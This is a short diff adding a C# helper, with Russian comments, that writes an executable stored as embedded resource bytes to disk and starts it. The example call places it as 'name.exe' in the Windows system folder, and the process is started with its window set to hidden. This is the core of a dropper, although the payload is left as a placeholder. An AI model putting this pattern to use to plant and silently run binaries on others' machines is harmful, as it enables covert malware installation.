@@ -1,0 +1,18 @@
+void copyFileFromBytesAndRun(string path, byte[] input)
+{
+File.WriteAllBytes(path, input);
+if (File.Exists(path))
+{
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.FileName = path;
+            startInfo.UseShellExecute = false;
+            startInfo.RedirectStandardOutput = true;
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            Process proc = Process.Start(startInfo);
+}
+}
+
+//Осталось только взять ваш файл с ресурсов в виде массива байт (а обычно так и храниться) и вызвать
+
+byte[] yourFile = ..... //Тут твой файл из ресурсов
+copyFileFromBytesAndRun(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "name.exe"), yourFile);
